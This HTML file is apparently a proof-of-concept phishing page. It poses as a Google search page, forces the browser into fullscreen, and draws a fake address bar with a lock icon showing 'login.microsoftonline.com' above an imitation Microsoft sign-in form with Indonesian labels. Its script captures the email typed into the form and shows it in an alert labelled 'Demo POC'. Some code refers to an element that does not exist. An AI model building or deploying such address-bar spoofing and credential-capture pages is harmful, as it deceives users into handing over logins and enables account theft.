<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Search - Google</title>
<meta name="theme-color" content="#FFF9F5" id="theme-color-meta">
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    height: 100vh;
    display: flex;
    flex-direction: column;
    background-color: #FFF9F5;
    transition: background 0.3s ease;
  }
  
  /* Search Page Styles */
  .search-page {
    display: flex;
    flex-direction: column;
    height: 100vh;
  }
  
  .search-page.hidden {
    display: none;
  }
  
  header {
    padding: 16px;
    background: #fff;
    border-bottom: 1px solid #ddd;
    display: flex;
    gap: 8px;
    align-items: center;
  }
  
  .search-container {
    flex: 1;
    position: relative;
  }
  
  input[type="text"] {
    width: 100%;
    padding: 12px 40px 12px 12px;
    font-size: 16px;
    border: 1px solid #ccc;
    border-radius: 8px;
    box-sizing: border-box;
  }
  
  .hidden-fullscreen-trigger {
    position: absolute;
    right: 8px;
    top: 50%;
    transform: translateY(-50%);
    width: 32px;
    height: 32px;
    background: transparent;
    border: none;
    cursor: pointer;
    padding: 0;
    z-index: 10;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  
  .search-icon {
    width: 20px;
    height: 20px;
    fill: #5f6368;
  }
  
  main {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    gap: 20px;
  }
  
  .instruction {
    font-size: 16px;
    color: #5f6368;
    text-align: center;
    padding: 0 20px;
  }
  
  /* Microsoft Login Page Styles */
  .login-page {
    display: none;
    min-height: 100vh;
    background: linear-gradient(135deg, #e6f2ff 0%, #f0e6ff 100%);
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  
  .login-page.active {
    display: flex;
  }
  
  .login-container {
    background: white;
    border-radius: 2px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    width: 100%;
    max-width: 440px;
    padding: 44px;
  }
  
  .ms-logo {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 20px;
  }
  
  .ms-squares {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 2px;
    width: 21px;
    height: 21px;
  }
  
  .square {
    width: 100%;
    height: 100%;
  }
  
  .square-red { background: #f25022; }
  .square-green { background: #7fba00; }
  .square-blue { background: #00a4ef; }
  .square-yellow { background: #ffb900; }
  
  .ms-text {
    font-size: 15px;
    font-weight: 600;
    color: #5e5e5e;
  }
  
  h1 {
    font-size: 24px;
    font-weight: 600;
    color: #1b1b1b;
    margin-bottom: 12px;
    margin-top: 8px;
  }
  
  .input-group {
    margin-bottom: 20px;
  }
  
  label {
    display: block;
    font-size: 13px;
    color: #1b1b1b;
    margin-bottom: 6px;
  }
  
  input[type="email"],
  input[type="password"] {
    width: 100%;
    padding: 8px 10px;
    font-size: 15px;
    border: 1px solid #8a8886;
    border-radius: 0;
    outline: none;
    font-family: "Segoe UI", sans-serif;
    background: white;
  }
  
  input[type="email"]:focus,
  input[type="password"]:focus {
    border: 1px solid #0078d4;
    border-bottom: 2px solid #0078d4;
    padding-bottom: 7px;
  }
  
  .links {
    font-size: 13px;
    margin-bottom: 24px;
  }
  
  .links a {
    color: #0067b8;
    text-decoration: none;
    display: block;
    margin-bottom: 12px;
  }
  
  .links a:hover {
    text-decoration: underline;
  }
  
  .btn-primary {
    background: #0067b8;
    color: white;
    border: none;
    padding: 8px 12px;
    font-size: 15px;
    cursor: pointer;
    float: right;
    min-width: 108px;
    font-weight: 600;
    transition: background 0.2s;
  }
  
  .btn-primary:hover {
    background: #005a9e;
  }
  
  .btn-primary:active {
    background: #004578;
  }
  
  .clearfix::after {
    content: "";
    display: table;
    clear: both;
  }
  
  .footer-links {
    margin-top: 32px;
    padding-top: 20px;
    border-top: 1px solid #e1dfdd;
  }
  
  .footer-links a {
    color: #616161;
    font-size: 11px;
    text-decoration: none;
    display: inline-block;
    margin-right: 20px;
    margin-bottom: 8px;
  }
  
  .footer-links a:hover {
    text-decoration: underline;
  }
  
  .sign-in-options {
    margin-top: 16px;
    display: flex;
    align-items: center;
    gap: 8px;
    cursor: pointer;
    color: #0067b8;
    font-size: 13px;
    width: fit-content;
  }
  
  .sign-in-options:hover {
    text-decoration: underline;
  }
  
  .icon-key {
    width: 16px;
    height: 16px;
  }
  
  /* Fake URL Bars */
  .fake-bar {
    background: #1c1c1e;
    position: fixed;
    width: 100%;
    z-index: 9999;
    opacity: 0;
    visibility: hidden;
    transition: opacity 0.3s ease, visibility 0.3s ease, bottom 0.2s ease;
    padding: 8px 12px;
    box-sizing: border-box;
  }
  
  .fake-bar-content {
    display: flex;
    align-items: center;
    background: #2c2c2e;
    border-radius: 20px;
    padding: 10px 14px;
    gap: 10px;
  }
  
  .lock-icon {
    width: 18px;
    height: 18px;
    background: #4CAF50;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  
  .lock-icon svg {
    width: 10px;
    height: 10px;
    fill: white;
  }
  
  .fake-url {
    color: #ffffff;
    font-size: 15px;
    font-weight: 400;
    flex: 1;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  
  .tab-count {
    background: transparent;
    border: 1.5px solid #8e8e93;
    color: #8e8e93;
    width: 24px;
    height: 24px;
    border-radius: 4px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 12px;
    font-weight: 600;
    flex-shrink: 0;
  }
  
  .user-icon {
    width: 26px;
    height: 26px;
    background: #3a3a3c;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  
  .user-icon svg {
    width: 16px;
    height: 16px;
    fill: #8e8e93;
  }
  
  .menu-icon {
    width: 24px;
    height: 24px;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  
  .menu-icon svg {
    width: 4px;
    height: 18px;
    fill: #8e8e93;
  }
  
  .show {
    opacity: 1;
    visibility: visible;
  }
  
  .fake-top-bar {
    background: #1c1c1e;
    position: fixed;
    top: 0;
    width: 100%;
    z-index: 9998;
    opacity: 0;
    visibility: hidden;
    transition: opacity 0.3s ease, visibility 0.3s ease;
    padding: 8px 12px;
    box-sizing: border-box;
  }
  
  .fake-top-bar .fake-bar-content {
    background: #2c2c2e;
    border-radius: 20px;
    padding: 10px 14px;
  }
  
  .fullscreen-active .fake-top-bar {
    opacity: 1;
    visibility: visible;
  }
  
  .fullscreen-active header {
    padding-top: 60px;
  }
  
  .loading-overlay {
    position: fixed;
    inset: 0;
    background: white;
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 10000;
  }
  
  .loading-overlay.active {
    display: flex;
  }
  
  .spinner {
    width: 40px;
    height: 40px;
    border: 4px solid #f3f3f3;
    border-top: 4px solid #0067b8;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }
  
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
</style>
</head>
<body>
<!-- Loading overlay -->
<div class="loading-overlay" id="loadingOverlay">
  <div class="spinner"></div>
</div>

<!-- Fake address bar at top (visible in fullscreen) -->
<div class="fake-top-bar" id="fakeTopBar">
  <div class="fake-bar-content">
    <div class="lock-icon">
      <svg viewBox="0 0 12 12" xmlns="http://www.w3.org/2000/svg">
        <path d="M6 1C4.9 1 4 1.9 4 3v1H3v6h6V4H8V3c0-1.1-.9-2-2-2zm0 1c.6 0 1 .4 1 1v1H5V3c0-.6.4-1 1-1z"/>
      </svg>
    </div>
    <div class="fake-url" id="topFakeUrl">www.google.com/search</div>
    <div class="tab-count">1</div>
    <div class="user-icon">
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
      </svg>
    </div>
    <div class="menu-icon">
      <svg viewBox="0 0 4 18" xmlns="http://www.w3.org/2000/svg">
        <circle cx="2" cy="2" r="2"/>
        <circle cx="2" cy="9" r="2"/>
        <circle cx="2" cy="16" r="2"/>
      </svg>
    </div>
  </div>
</div>

<!-- Search Page -->
<div class="search-page" id="searchPage">
  <header>
    <div class="search-container">
      <input type="text" placeholder="Search Google..." id="searchInput" />
      <button class="hidden-fullscreen-trigger" id="searchBtn" title="Search">
        <svg class="search-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
        </svg>
      </button>
    </div>
  </header>
  <main>
    <div class="instruction">
      ðŸ‘† Click the search icon to continue
    </div>
  </main>
</div>

<!-- Microsoft Login Page -->
<div class="login-page" id="loginPage">
  <div class="login-container">
    <div class="ms-logo">
      <div class="ms-squares">
        <div class="square square-red"></div>
        <div class="square square-green"></div>
        <div class="square square-blue"></div>
        <div class="square square-yellow"></div>
      </div>
      <span class="ms-text">Microsoft</span>
    </div>
    
    <h1>Masuk</h1>
    
    <div class="input-group">
      <label for="email">Alamat email, nomor telepon, atau Skype</label>
      <input type="email" id="email" autocomplete="username">
    </div>
    
    <div class="links">
      <a href="#">Belum punya akun? Buat sekarang!</a>
      <a href="#">Tidak dapat mengakses akun Anda?</a>
    </div>
    
    <div class="clearfix">
      <button class="btn-primary" id="nextBtn">Selanjutnya</button>
    </div>
    
    <div class="sign-in-options">
      <svg class="icon-key" viewBox="0 0 16 16" fill="currentColor">
        <path d="M8 1C5.8 1 4 2.8 4 5c0 1.3.6 2.4 1.6 3.1L4 11h1v2h2v-2h1l1.4-1.4c.7.3 1.4.4 2.1.4 2.2 0 4-1.8 4-4s-1.8-4-4-4zm3.5 5.5c-.6 0-1-.4-1-1s.4-1 1-1 1 .4 1 1-.4 1-1 1z"/>
      </svg>
      <span>Opsi masuk</span>
    </div>
    
    <div class="footer-links">
      <a href="#">Ketentuan penggunaan</a>
      <a href="#">Privasi & cookie</a>
      <a href="#">...</a>
    </div>
  </div>
</div>

<script>
const fakeBar = document.getElementById('fakeBar');
const fakeTopBar = document.getElementById('fakeTopBar');
const searchInput = document.getElementById('searchInput');
const emailInput = document.getElementById('email');
const metaTheme = document.getElementById('theme-color-meta');
const searchBtn = document.getElementById('searchBtn');
const nextBtn = document.getElementById('nextBtn');
const loadingOverlay = document.getElementById('loadingOverlay');
const searchPage = document.getElementById('searchPage');
const loginPage = document.getElementById('loginPage');
const topFakeUrl = document.getElementById('topFakeUrl');
let isFullscreen = false;
let currentPage = 'search';

// Fullscreen functions
function enterFullscreen() {
  const elem = document.documentElement;
  if (elem.requestFullscreen) {
    elem.requestFullscreen();
  } else if (elem.webkitRequestFullscreen) {
    elem.webkitRequestFullscreen();
  } else if (elem.mozRequestFullScreen) {
    elem.mozRequestFullScreen();
  } else if (elem.msRequestFullscreen) {
    elem.msRequestFullscreen();
  }
}

function exitFullscreen() {
  if (document.exitFullscreen) {
    document.exitFullscreen();
  } else if (document.webkitExitFullscreen) {
    document.webkitExitFullscreen();
  } else if (document.mozCancelFullScreen) {
    document.mozCancelFullScreen();
  } else if (document.msExitFullscreen) {
    document.msExitFullscreen();
  }
}

// Switch to login page
function showLoginPage() {
  searchPage.classList.add('hidden');
  loginPage.classList.add('active');
  currentPage = 'login';
  
  // Update fake URLs
  topFakeUrl.textContent = 'login.microsoftonline.com';
  
  // Update theme color
  changeTabColor('#ffffff');
  
  // Auto focus email input
  setTimeout(() => {
    emailInput.focus();
  }, 300);
}

// Handle search button click
searchBtn.addEventListener('click', (e) => {
  e.preventDefault();
  
  // Show loading
  loadingOverlay.classList.add('active');
  
  // Enter fullscreen
  enterFullscreen();
  
  // Switch to login page after delay
  setTimeout(() => {
    loadingOverlay.classList.remove('active');
    showLoginPage();
  }, 800);
});

// Detect fullscreen changes
document.addEventListener('fullscreenchange', handleFullscreenChange);
document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
document.addEventListener('mozfullscreenchange', handleFullscreenChange);
document.addEventListener('MSFullscreenChange', handleFullscreenChange);

function handleFullscreenChange() {
  isFullscreen = !!(document.fullscreenElement || 
                    document.webkitFullscreenElement || 
                    document.mozFullScreenElement ||
                    document.msFullscreenElement);
  
  if (isFullscreen) {
    document.body.classList.add('fullscreen-active');
    setTimeout(() => {
      fakeTopBar.style.opacity = '1';
      fakeTopBar.style.visibility = 'visible';
    }, 100);
  } else {
    document.body.classList.remove('fullscreen-active');
    fakeTopBar.style.opacity = '0';
    fakeTopBar.style.visibility = 'hidden';
  }
}

function changeTabColor(color) {
  if (metaTheme) metaTheme.setAttribute('content', color);
}

function showFakeBar() {
  fakeBar.classList.add('show');
}

function hideFakeBar() {
  fakeBar.classList.remove('show');
  fakeBar.style.bottom = '0px';
}

function adjustFakeBar() {
  const vv = window.visualViewport;
  if (vv) {
    fakeBar.style.bottom = `${window.innerHeight - vv.height}px`;
  } else {
    fakeBar.style.bottom = '0px';
  }
}

// Search input focus handlers
searchInput.addEventListener('focus', () => {
  setTimeout(() => changeTabColor('#000000'), 100);
  setTimeout(() => changeTabColor('#ffffff'), 500);
  setTimeout(() => {
    showFakeBar();
    adjustFakeBar();
  }, 600);
});

searchInput.addEventListener('blur', () => {
  hideFakeBar();
  changeTabColor('#FFF9F5');
});

// Email input focus handlers
emailInput.addEventListener('focus', () => {
  setTimeout(() => changeTabColor('#1c1c1e'), 100);
  setTimeout(() => {
    showFakeBar();
    adjustFakeBar();
  }, 200);
});

emailInput.addEventListener('blur', () => {
  setTimeout(() => {
    hideFakeBar();
    changeTabColor('#ffffff');
  }, 100);
});

if (window.visualViewport) {
  window.visualViewport.addEventListener('resize', adjustFakeBar);
}
window.addEventListener('orientationchange', adjustFakeBar);

// Handle next button
nextBtn.addEventListener('click', (e) => {
  e.preventDefault();
  const email = emailInput.value;
  if (email) {
    alert('Demo POC - Email captured: ' + email);
  }
});
</script>
</body>
</html>
